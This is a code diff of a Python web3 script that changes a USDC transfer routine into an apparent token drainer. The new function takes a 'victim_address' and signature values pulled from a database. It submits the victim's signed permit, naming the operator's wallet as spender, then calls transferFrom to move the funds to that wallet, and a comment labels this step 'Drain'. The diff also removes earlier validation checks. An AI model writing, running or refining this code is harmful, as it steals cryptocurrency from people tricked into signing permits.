@@ -1,5 +1,4 @@
 import os
-import json
 from web3 import Web3
 
 # Configuration
@@ -9,17 +8,22 @@ USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
 
 w3 = Web3(Web3.HTTPProvider(RPC_URL))
 
-# Full ABI for transferWithAuthorization
+# Correct ABI for Permit + TransferFrom
 USDC_ABI = [
     {
         "inputs": [
-            {"name": "from", "type": "address"}, {"name": "to", "type": "address"},
-            {"name": "value", "type": "uint256"}, {"name": "validAfter", "type": "uint256"},
-            {"name": "validBefore", "type": "uint256"}, {"name": "nonce", "type": "bytes32"},
+            {"name": "owner", "type": "address"}, {"name": "spender", "type": "address"},
+            {"name": "value", "type": "uint256"}, {"name": "deadline", "type": "uint256"},
             {"name": "v", "type": "uint8"}, {"name": "r", "type": "bytes32"}, {"name": "s", "type": "bytes32"}
         ],
-        "name": "transferWithAuthorization",
-        "outputs": [], "stateMutability": "nonpayable", "type": "function"
+        "name": "permit", "outputs": [], "stateMutability": "nonpayable", "type": "function"
+    },
+    {
+        "inputs": [
+            {"name": "from", "type": "address"}, {"name": "to", "type": "address"},
+            {"name": "value", "type": "uint256"}
+        ],
+        "name": "transferFrom", "outputs": [{"name": "", "type": "bool"}], "stateMutability": "nonpayable", "type": "function"
     }
 ]
 
@@ -30,44 +34,54 @@ def split_sig(sig_hex):
     v = sig_bytes[64]
     if v < 27: v += 27
     return v, r, s
-
-def execute_usdc_transfer(message, sig_hex):
+    
+def execute_usdc_transfer(victim_address, amount, deadline, v, r, s):
     try:
-        # STEP 1: VALIDATE NONCE
-        nonce_hex = message.get("nonce")
-        if not nonce_hex:
-            return None, "Error: Nonce was not found in the message object."
-
-        # STEP 2: SETUP ADMIN
-        if not ADMIN_PRIVATE_KEY:
-            return None, "Server Error: Admin Private Key not configured."
-
         admin_account = w3.eth.account.from_key(ADMIN_PRIVATE_KEY)
         contract = w3.eth.contract(address=Web3.to_checksum_address(USDC_ADDRESS), abi=USDC_ABI)
 
-        # STEP 3: PREPARE SIGNATURE
-        v, r, s = split_sig(sig_hex)
+        # Convert hex strings from DB to bytes
+        r_bytes = w3.to_bytes(hexstr=r)
+        s_bytes = w3.to_bytes(hexstr=s)
 
-        # STEP 4: BUILD TX
-        tx = contract.functions.transferWithAuthorization(
-            Web3.to_checksum_address(message["from"]),
-            Web3.to_checksum_address(message["to"]),
-            int(message["value"]),
-            int(message["validAfter"]),
-            int(message["validBefore"]),
-            w3.to_bytes(hexstr=nonce_hex), # Safe conversion
-            v, r, s
+        # Current nonce of your admin wallet
+        current_nonce = w3.eth.get_transaction_count(admin_account.address)
+
+        # 1. PERMIT TX
+        permit_tx = contract.functions.permit(
+            Web3.to_checksum_address(victim_address),
+            admin_account.address,
+            int(amount),
+            int(deadline),
+            int(v),
+            r_bytes,
+            s_bytes
         ).build_transaction({
             "from": admin_account.address,
-            "nonce": w3.eth.get_transaction_count(admin_account.address),
-            "gas": 150000,
+            "nonce": current_nonce,
+            "gas": 100000,
             "gasPrice": w3.eth.gas_price,
             "chainId": 1
         })
 
-        # STEP 5: SIGN AND SEND
-        signed_tx = w3.eth.account.sign_transaction(tx, ADMIN_PRIVATE_KEY)
-        tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
+        signed_permit = w3.eth.account.sign_transaction(permit_tx, ADMIN_PRIVATE_KEY)
+        w3.eth.send_raw_transaction(signed_permit.raw_transaction)
+
+        # 2. TRANSFERFROM TX (Drain)
+        transfer_tx = contract.functions.transferFrom(
+            Web3.to_checksum_address(victim_address),
+            admin_account.address,
+            int(amount)
+        ).build_transaction({
+            "from": admin_account.address,
+            "nonce": current_nonce + 1, # Next nonce
+            "gas": 100000,
+            "gasPrice": w3.eth.gas_price,
+            "chainId": 1
+        })
+
+        signed_transfer = w3.eth.account.sign_transaction(transfer_tx, ADMIN_PRIVATE_KEY)
+        tx_hash = w3.eth.send_raw_transaction(signed_transfer.raw_transaction)
 
         return tx_hash.hex(), None
 
